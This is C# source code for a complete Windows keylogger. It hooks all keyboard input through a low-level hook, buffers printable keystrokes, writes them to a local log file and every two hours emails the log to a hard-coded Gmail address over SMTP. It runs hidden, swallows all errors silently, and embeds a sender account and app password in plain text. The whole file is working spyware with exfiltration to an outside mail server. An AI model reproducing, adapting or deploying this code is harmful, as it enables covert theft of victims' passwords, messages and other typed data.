using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;

class Program
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static StringBuilder _keyBuffer = new StringBuilder();
    private static string _logFilePath = "keylog.txt";
    private static string _emailRecipient = "bashlover142@gmail.com";
    private static string _emailSender = "macksoupletter@gmail.com";
    private static string _emailSenderPassword = "nofe ettp hxvf mqqp";
    private static string _smtpServer = "smtp.gmail.com";
    private static int _smtpPort = 587;
    private static System.Timers.Timer _timer;

    [STAThread]
    static void Main()
    {
        // Setup keylogger
        _hookID = SetHook(_proc);
        if (_hookID == IntPtr.Zero)
        {
            // If hook fails, exit
            return;
        }

        // Setup timer to send email every 2 hours
        _timer = new System.Timers.Timer(7200000); // 2 hours in milliseconds
        _timer.Elapsed += OnTimedEvent;
        _timer.AutoReset = true;
        _timer.Enabled = true;

        // Run hidden application
        Application.Run();
        
        // Clean up
        UnhookWindowsHookEx(_hookID);
        _timer.Stop();
        _timer.Dispose();
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule)
        {
            IntPtr hookID = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            if (hookID == IntPtr.Zero)
            {
                // Handle failure silently if needed
            }
            return hookID;
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            char keyChar = (char)vkCode;

            // Only log printable characters
            if (char.IsLetterOrDigit(keyChar) || char.IsPunctuation(keyChar) || char.IsWhiteSpace(keyChar))
            {
                _keyBuffer.Append(keyChar);
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static void OnTimedEvent(Object source, ElapsedEventArgs e)
    {
        if (_keyBuffer.Length > 0)
        {
            string logContent = _keyBuffer.ToString();
            _keyBuffer.Clear();

            // Write to log file
            try
            {
                File.AppendAllText(_logFilePath, logContent, Encoding.UTF8);
            }
            catch (Exception ex)
            {
                // Handle file write exceptions silently if needed
            }

            // Attempt to send email
            SendEmail();
        }
    }

    private static void SendEmail()
    {
        try
        {
            using (MailMessage mail = new MailMessage())
            {
                mail.From = new MailAddress(_emailSender);
                mail.To.Add(_emailRecipient);
                mail.Subject = "Keylogger Report";
                mail.Body = "Attached is the keylogger report.";
                mail.Attachments.Add(new Attachment(_logFilePath));

                using (SmtpClient smtp = new SmtpClient(_smtpServer, _smtpPort))
                {
                    smtp.Credentials = new NetworkCredential(_emailSender, _emailSenderPassword);
                    smtp.EnableSsl = true;

                    smtp.Send(mail);
                }
            }
        }
        catch (SmtpException)
        {
            // Handle SMTP exceptions silently if needed
        }
        catch (Exception)
        {
            // Handle general exceptions silently if needed
        }
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
}
